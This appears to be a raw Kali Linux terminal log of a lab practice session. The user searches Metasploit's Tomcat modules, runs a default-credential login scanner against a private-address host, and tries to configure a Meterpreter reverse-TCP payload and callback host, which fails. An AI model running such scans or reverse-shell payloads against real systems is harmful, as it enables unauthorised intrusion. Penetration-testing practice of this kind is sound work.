+└─$ sudo msfdb reinit
+sudo apt update
+sudo apt install --reinstall metasploit-framework
+[i] Database already started
+[+] Dropping databases 'msf'
+[+] Dropping databases 'msf_test'
+[+] Dropping database user 'msf'
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+Hit:1 http://http.kali.org/kali kali-rolling InRelease
+30 packages can be upgraded. Run 'apt list --upgradable' to see them.
+Summary:                        
+  Upgrading: 0, Installing: 0, Reinstalling: 1, Removing: 0, Not Upgrading: 30
+  Download size: 260 MB
+  Space needed: 0 B / 33.3 GB available
+
+Get:1 http://kali.download/kali kali-rolling/main amd64 metasploit-framework amd64 6.4.126-0kali1 [260 MB]
+Fetched 260 MB in 49s (5,305 kB/s)                                                                                                                                                               
+(Reading database… 475962 files and directories currently installed.)
+Preparing to unpack …/metasploit-framework_6.4.126-0kali1_amd64.deb…
+Unpacking metasploit-framework (6.4.126-0kali1) over (6.4.126-0kali1)…
+Setting up metasploit-framework (6.4.126-0kali1)…
+Processing triggers for wordlists (2026.2.0)…
+Processing triggers for kali-menu (2026.2.4)…
+Processing triggers for libc-bin (2.42-13)…
+Processing triggers for man-db (2.13.1-1)…
+Scanning processes...                                                                                                                                                                             
+Scanning linux images...                                                                                                                                                                          
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Open an interactive Ruby terminal with irb
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |                                                                                                                                       
+  +---------------------------+---------------------------+                                                                                                                                       
+  |      __________________   |                           |                                                                                                                                       
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                                                       
+  |             )=\           | |  EXPLOIT   \            |                                                                                                                                       
+  |            // \\          | |_____________\_______    |                                                                                                                                       
+  |           //   \\         | |==[msf >]============\   |                                                                                                                                       
+  |          //     \\        | |______________________\  |                                                                                                                                       
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                                                       
+  |        //         \\      |  *********************    |                                                                                                                                       
+  +---------------------------+---------------------------+                                                                                                                                       
+  |      o O o                |        \'\/\/\/'/         |                                                                                                                                       
+  |              o O          |         )======(          |                                                                                                                                       
+  |                 o         |       .'  LOOT  '.        |                                                                                                                                       
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                                                       
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                                                       
+  | |________________|__|)__| |    |     __||_)     |     |                                                                                                                                       
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                                                       
+  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                                                       
+  +---------------------------+---------------------------+                                                                                                                                       
+
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,328 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > reload_all
+[*] Reloading modules from all module paths...
+/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,331 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search tomcat
+
+Matching Modules
+================
+
+   #   Name                                                                       Disclosure Date  Rank       Check  Description
+   -   ----                                                                       ---------------  ----       -----  -----------
+   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   1   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   2   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3     \_ target: Automatic detection                                           .                .          .      .
+   4     \_ target: Windows                                                       .                .          .      .
+   5     \_ target: Linux                                                         .                .          .      .
+   6   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   7     \_ target: Java                                                          .                .          .      .
+   8     \_ target: Linux                                                         .                .          .      .
+   9     \_ target: Windows                                                       .                .          .      .
+   10    \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
+   11  auxiliary/admin/http/tomcat_ghostcat                                       2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   12  exploit/windows/http/tomcat_cgi_cmdlineargs                                2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+   13  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   14    \_ target: Automatic                                                     .                .          .      .
+   15    \_ target: Java Universal                                                .                .          .      .
+   16    \_ target: Windows Universal                                             .                .          .      .
+   17    \_ target: Linux x86                                                     .                .          .      .
+   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   19    \_ target: Java Universal                                                .                .          .      .
+   20    \_ target: Windows Universal                                             .                .          .      .
+   21    \_ target: Linux x86                                                     .                .          .      .
+   22  auxiliary/dos/http/apache_tomcat_transfer_encoding                         2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   23  auxiliary/scanner/http/tomcat_enum                                         .                normal     No     Apache Tomcat User Enumeration
+   24  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                        2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
+   25  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                        2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
+   26  exploit/multi/http/atlassian_confluence_webwork_ognl_injection             2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
+   27    \_ target: Unix Command                                                  .                .          .      .
+   28    \_ target: Linux Dropper                                                 .                .          .      .
+   29    \_ target: Windows Command                                               .                .          .      .
+   30    \_ target: Windows Dropper                                               .                .          .      .
+   31    \_ target: PowerShell Stager                                             .                .          .      .
+   32  exploit/windows/http/cayin_xpost_sql_rce                                   2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
+   33  exploit/multi/http/cisco_dcnm_upload_2019                                  2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   34    \_ target: Automatic                                                     .                .          .      .
+   35    \_ target: Cisco DCNM 11.1(1)                                            .                .          .      .
+   36    \_ target: Cisco DCNM 11.0(1)                                            .                .          .      .
+   37    \_ target: Cisco DCNM 10.4(2)                                            .                .          .      .
+   38  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec               2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
+   39    \_ target: Unix Command                                                  .                .          .      .
+   40    \_ target: Linux Dropper                                                 .                .          .      .
+   41  exploit/linux/http/cisco_hyperflex_file_upload_rce                         2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
+   42    \_ target: Java Dropper                                                  .                .          .      .
+   43    \_ target: Linux Dropper                                                 .                .          .      .
+   44  exploit/linux/http/cpi_tararchive_upload                                   2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   45  exploit/linux/http/cisco_prime_inf_rce                                     2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   46  post/multi/gather/tomcat_gather                                            .                normal     No     Gather Tomcat Credentials
+   47  auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
+   48  auxiliary/admin/http/ibm_drm_download                                      2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
+   49  exploit/multi/http/ivanti_epmm_rce_cve_2025_4427_4428                      2025-05-13       excellent  Yes    Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution
+   50  exploit/linux/http/lucee_admin_imgprocess_file_write                       2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
+   51    \_ target: Unix Command                                                  .                .          .      .
+   52    \_ target: Linux Dropper                                                 .                .          .      .
+   53  exploit/linux/http/mobileiron_core_log4shell                               2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
+   54    \_ AKA: Log4Shell                                                        .                .          .      .
+   55    \_ AKA: LogJam                                                           .                .          .      .
+   56  exploit/multi/http/zenworks_configuration_management_upload                2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   57  exploit/multi/http/primefaces_weak_encryption_rce                          2016-02-15       excellent  Yes    Primefaces Remote Code Execution Exploit
+   58  exploit/multi/http/spring_framework_rce_spring4shell                       2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
+   59    \_ target: Java                                                          .                .          .      .
+   60    \_ target: Linux                                                         .                .          .      .
+   61    \_ target: Windows                                                       .                .          .      .
+   62    \_ AKA: Spring4Shell                                                     .                .          .      .
+   63    \_ AKA: SpringShell                                                      .                .          .      .
+   64  auxiliary/admin/http/tomcat_administration                                 .                normal     No     Tomcat Administration Tool Default Access
+   65  auxiliary/scanner/http/tomcat_mgr_login                                    .                normal     No     Tomcat Application Manager Login Utility
+   66  exploit/multi/http/tomcat_partial_put_deserialization                      2025-03-10       excellent  Yes    Tomcat Partial PUT Java Deserialization
+   67    \_ target: Unix Command                                                  .                .          .      .
+   68    \_ target: Windows Command                                               .                .          .      .
+   69  exploit/multi/http/tomcat_jsp_upload_bypass                                2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+   70    \_ target: Automatic                                                     .                .          .      .
+   71    \_ target: Java Windows                                                  .                .          .      .
+   72    \_ target: Java Linux                                                    .                .          .      .
+   73  auxiliary/admin/http/tomcat_utf8_traversal                                 2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   74  auxiliary/admin/http/trendmicro_dlp_traversal                              2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+   75  post/windows/gather/enum_tomcat                                            .                normal     No     Windows Gather Apache Tomcat Enumeration
+
+
+Interact with a module by name or index. For example info 75, use 75 or use post/windows/gather/enum_tomcat
+
+msf > msfconsole -v
+[-] msfconsole cannot be run inside msfconsole
+msf > search tomcat_mgr
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank       Check  Description
+   -  ----                                     ---------------  ----       -----  -----------
+   0  exploit/multi/http/tomcat_mgr_deploy     2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   1    \_ target: Automatic                   .                .          .      .
+   2    \_ target: Java Universal              .                .          .      .
+   3    \_ target: Windows Universal           .                .          .      .
+   4    \_ target: Linux x86                   .                .          .      .
+   5  exploit/multi/http/tomcat_mgr_upload     2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   6    \_ target: Java Universal              .                .          .      .
+   7    \_ target: Windows Universal           .                .          .      .
+   8    \_ target: Linux x86                   .                .          .      .
+   9  auxiliary/scanner/http/tomcat_mgr_login  .                normal     No     Tomcat Application Manager Login Utility
+
+
+Interact with a module by name or index. For example info 9, use 9 or use auxiliary/scanner/http/tomcat_mgr_login
+
+msf > use auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.78.133
+RHOSTS => 192.168.78.133
+msf auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8080
+RPORT => 8080
+msf auxiliary(scanner/http/tomcat_mgr_login) > set THREADS 10
+THREADS => 10
+msf auxiliary(scanner/http/tomcat_mgr_login) > exploit
+[-] The connection was refused by the remote host (192.168.78.133:8080).
+[-] The connection was refused by the remote host (192.168.78.133:8080).
+[-] http://192.168.78.133:8080/manager/html - No response
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/http/tomcat_mgr_login) > exploit
+[-] The connection was refused by the remote host (192.168.78.133:8080).
+[-] The connection was refused by the remote host (192.168.78.133:8080).
+[-] http://192.168.78.133:8080/manager/html - No response
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/http/tomcat_mgr_login) > set HttpUsername tomcat
+HttpUsername => tomcat
+msf auxiliary(scanner/http/tomcat_mgr_login) > set HttpPassword tomcat
+HttpPassword => tomcat
+msf auxiliary(scanner/http/tomcat_mgr_login) > set PAYLOAD java/meterpreter/reverse_tcp
+[!] Unknown datastore option: PAYLOAD.
+PAYLOAD => java/meterpreter/reverse_tcp
+msf auxiliary(scanner/http/tomcat_mgr_login) > set LHOST 192.168.78.130
+[!] Unknown datastore option: LHOST. Did you mean VHOST?
+LHOST => 192.168.78.130
+msf auxiliary(scanner/http/tomcat_mgr_login) > exploit
+[-] The connection was refused by the remote host (192.168.78.133:8080).
+[-] The connection was refused by the remote host (192.168.78.133:8080).
+[-] http://192.168.78.133:8080/manager/html - No response
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/http/tomcat_mgr_login) > tomcat_mgr_login
+[-] Unknown command: tomcat_mgr_login. Run the help command for more details.
+msf auxiliary(scanner/http/tomcat_mgr_login) > exit
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: When in a module, use back to go back to the top level 
+prompt
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,331 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf > active sessions
+[-] Unknown command: active. Run the help command for more details.
+msf > sessions -i 1
+[-] Invalid session identifier: 1
+msf > exit
+                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: View a module's description using info, or the enhanced 
+version in your browser with info -d
+                                                  
+
+  Metasploit Park, System Security Interface                                                                                                                                                      
+  Version 4.0.5, Alpha E                                                                                                                                                                          
+  Ready...                                                                                                                                                                                        
+  > access security                                                                                                                                                                               
+  access: PERMISSION DENIED.
+  > access security grid
+  access: PERMISSION DENIED.
+  > access main security grid
+  access: PERMISSION DENIED....and...
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                  
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                  
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                  
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                  
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                  
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                  
+
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,331 auxiliary - 2,163 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf > ping 192.168.78.133
+[*] exec: ping 192.168.78.133
+
+PING 192.168.78.133 (192.168.78.133) 56(84) bytes of data.
+64 bytes from 192.168.78.133: icmp_seq=1 ttl=64 time=6.95 ms
+64 bytes from 192.168.78.133: icmp_seq=2 ttl=64 time=0.467 ms
+64 bytes from 192.168.78.133: icmp_seq=3 ttl=64 time=1.35 ms
+64 bytes from 192.168.78.133: icmp_seq=4 ttl=64 time=1.34 ms
+64 bytes from 192.168.78.133: icmp_seq=5 ttl=64 time=0.901 ms
+64 bytes from 192.168.78.133: icmp_seq=6 ttl=64 time=0.690 ms
+64 bytes from 192.168.78.133: icmp_seq=7 ttl=64 time=1.95 ms
+64 bytes from 192.168.78.133: icmp_seq=8 ttl=64 time=0.562 ms
+64 bytes from 192.168.78.133: icmp_seq=9 ttl=64 time=1.58 ms
+64 bytes from 192.168.78.133: icmp_seq=10 ttl=64 time=1.41 ms
+64 bytes from 192.168.78.133: icmp_seq=11 ttl=64 time=0.970 ms
+64 bytes from 192.168.78.133: icmp_seq=12 ttl=64 time=0.899 ms
+64 bytes from 192.168.78.133: icmp_seq=13 ttl=64 time=0.826 ms
+64 bytes from 192.168.78.133: icmp_seq=14 ttl=64 time=1.59 ms
+64 bytes from 192.168.78.133: icmp_seq=15 ttl=64 time=1.24 ms
+^C
+--- 192.168.78.133 ping statistics ---
+15 packets transmitted, 15 received, 0% packet loss, time 14064ms
+rtt min/avg/max/mdev = 0.467/1.515/6.954/1.508 ms
+Interrupt: use the 'exit' command to quit
+msf > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf > show options
+
+Global Options:
+===============
+
+   Option             Current Setting  Description
+   ------             ---------------  -----------
+   ConsoleLogging     false            Log all console input and output
+   LogLevel           0                Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt                   The meterpreter prompt string
+   MinimumRank        manual           The minimum rank of exploits that will run without explicit confirmation (Accepted: manual, low, average, normal, good, great, excellent)
+   Prompt                              The prompt string
+   PromptChar                          The prompt character
+   PromptTimeFormat                    Format for timestamp escapes in prompts
+   SessionLogging     false            Log all input and output for sessions
+   SessionTlvLogging                   Log all incoming and outgoing TLV packets
+   TimestampOutput    false            Prefix all console output with a timestamp
+   VERBOSE            false            Enable detailed status messages - the specific behavior can differ per module
+
+msf > Interrupt: use the 'exit' command to quit
+msf > set SessionLogging true  
+Session logging enabled.
+SessionLogging => true
+msf > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf > exit
